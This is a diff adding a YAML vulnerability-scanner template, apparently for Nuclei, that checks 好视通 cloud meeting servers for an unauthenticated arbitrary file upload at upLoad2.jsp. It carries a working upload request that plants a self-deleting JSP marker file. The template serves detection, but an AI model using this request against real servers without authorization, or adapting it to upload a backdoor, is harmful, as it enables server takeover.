@@ -1,0 +1,36 @@
+id: hst-upLoad2-upload
+
+info:
+  name: 好视通-云会议 upload2.jsp - File Upload
+  author: qwtd
+  severity: critical
+  description: 好视通云会议/fm/systemConfig/upLoad2.jsp接口处存在任意文件上传漏洞，未经身份认证的攻击者可以通过此漏洞上传恶意后门文件，最终可获取服务器权限。
+  reference:
+    - https://wiki.wy876.cn/#/./%E5%A5%BD%E8%A7%86%E9%80%9A%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F/%E5%A5%BD%E8%A7%86%E9%80%9A%E4%BA%91%E4%BC%9A%E8%AE%AEupLoad2.jsp%E6%8E%A5%E5%8F%A3%E5%A4%84%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E
+  tags: 好视通-云会议
+
+http:
+  - raw:
+      - |-
+        @timeout: 30s
+        POST /fm/systemConfig/upLoad2.jsp HTTP/1.1
+        Content-Type: multipart/form-data; boundary=1515df1sdfdsfddfs
+        Accept-Encoding: gzip
+
+        --1515df1sdfdsfddfs
+        Content-Disposition: form-data; name="file"; filename="{{randstr_1}}.jsp"
+        Content-Type: application/octet-stream
+
+        <% out.print("{{randstr_2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        --1515df1sdfdsfddfs--
+
+      - |-
+        GET /fm/upload/{{randstr_1}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200
+          - status_code_2 == 200 && contains(body_2,"{{randstr_2}}")
+        condition: and
